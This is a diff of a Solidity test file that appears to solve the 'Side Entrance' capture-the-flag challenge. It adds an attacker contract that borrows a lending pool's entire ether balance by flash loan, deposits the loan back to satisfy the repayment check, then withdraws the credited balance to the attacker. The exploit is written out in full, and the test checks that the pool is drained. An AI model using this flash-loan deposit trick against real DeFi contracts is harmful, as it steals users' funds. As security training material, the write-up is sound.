@@ -36,7 +36,10 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        FlashLoanEtherReceiver flashLoanEtherReceiver = new FlashLoanEtherReceiver(sideEntranceLenderPool);
+        flashLoanEtherReceiver.pwn();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -48,4 +51,31 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+contract FlashLoanEtherReceiver {
+    SideEntranceLenderPool sideEntranceLenderPool;
+    address owner;
+
+    constructor(SideEntranceLenderPool _sideEntranceLenderPool) {
+        owner = msg.sender;
+        sideEntranceLenderPool = _sideEntranceLenderPool;
+    }
+
+    function execute() external payable {
+        require(msg.sender == address(sideEntranceLenderPool), "only pool can call this function");
+        sideEntranceLenderPool.deposit{value: msg.value}();
+    }
+
+    function pwn() external {
+        require(msg.sender == owner, "only owner can call this function");
+        sideEntranceLenderPool.flashLoan(address(sideEntranceLenderPool).balance);
+
+        // We have deposited all the flashloan we borrowed inside execute(),
+        // so we have lots of balance at this stage
+        sideEntranceLenderPool.withdraw();
+        payable(owner).transfer(address(this).balance);
+    }
+
+    receive () external payable {}
 }
